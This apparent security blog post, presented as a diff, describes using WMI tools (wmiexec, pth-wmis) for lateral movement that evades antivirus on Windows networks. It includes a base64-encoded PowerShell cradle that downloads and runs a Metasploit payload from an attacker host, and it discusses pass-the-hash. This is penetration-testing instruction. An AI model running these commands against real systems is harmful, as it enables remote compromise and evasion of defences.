@@ -1,0 +1,65 @@
+It is fairly common to see pentesters use PSexec style tools such as the psexec module in Metasploit, smbexec, winexe, or even the original sysinternals tool. These tools have worked really well, however, they are fairly noisy creating a service and touching disk which will trigger modern defense tools such as Bit9 and other tools that detect rogue binaries on systems.
+
+Even using something like the standard psexec module in Metasploit nowadays will cause Windows Security Essentials to flag the service exe that gets created.
+
+Figure 1 – PSExec service wvtLQBXv.exe failing because of AV
+
+Figure 2 – Microsoft Security Essentials flagging service exe
+
+Using WMI (Windows Management Instrumentation) gives us another path to execute code and commands on remote systems without touching disk or creating a new service. We also have the ability to use the actual password or the hash.
+
+The initial WMI communications use TCP port 135 and afterwards a random port is negotiated. Since WMI and RPC services are often used for remote administration and administration tools, it is common to see these ports open and unfiltered on internal networks.
+
+Two options that ship with Kali for executing code with WMI are impackets wmiexec and pth-wmis.
+
+In both examples I will use the Metasploit web_delivery module configured to deliver a powershell payload.
+
+Figure 3 Web Delivery configuration
+
+First up is wmiexec which will give you a semi interactive shell.
+
+
+
+Figure 4 – Impacket wmiexec semi interactive shell
+
+However, after you launch a shell you could combine it with some powershell as well Metasploit’s webdelivery module to launch a full meterpeter session.
+
+Figure 5 WMIExec launch powershell
+
+Figure 6 – Successfull call back
+
+Next up, pth-wmis.
+
+Thanks to Larry Spohn (@spoonman1091) for this link http://passing-the-hash.blogspot.com/2013/04/pth-toolkit-for-kali-interim-status.html
+
+pth-wmis doesn’t work on 64 bit Kali, however, pth-wmic works with no issues and apparently this has been a problem since 2013. After downloading the 32 bit version of pth-wmis and the required libraries, we are back up and running.
+
+Let’s first encode our web delivery string:
+
+root@nitro0:~# echo "iex (New-Object Net.WebClient).DownloadString('http://172.16.67.128:80/6WcepYO')" | iconv --to-code UTF-16LE | base64 -w 0
+
+aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA2ADcALgAxADIAOAA6ADgAMAAvADYAVwBjAGUAcABZAE8AJwApAAoA
+
+Figure 7 – Launching powershell with wmis-pth
+
+Figure 8 – Successful callback
+
+WMI is also a powerful tool to gather information on remote systems. I will write a follow up post on using WMI as another tool for information gathering.
+
+MSF PSexec – http://www.rapid7.com/db/modules/exploit/windows/smb/psexec
+
+Sysinternal PSexec – https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx
+
+SMbexec – https://github.com/pentestgeek/smbexec
+
+Winexe – http://sourceforge.net/projects/winexe/
+
+PtH tool kit – https://code.google.com/p/passing-the-hash/downloads/list
+
+Impacket – https://github.com/coresecurity/impacket
+
+Kali Linux – https://www.kali.org/
+
+WMIS: The Missing Piece of the Ownage Puzzle – http://passing-the-hash.blogspot.com/2013/07/WMIS-PowerSploit-Shells.html
+
+This article was written by Justin Elze (@justinelze) of TrustedSec.
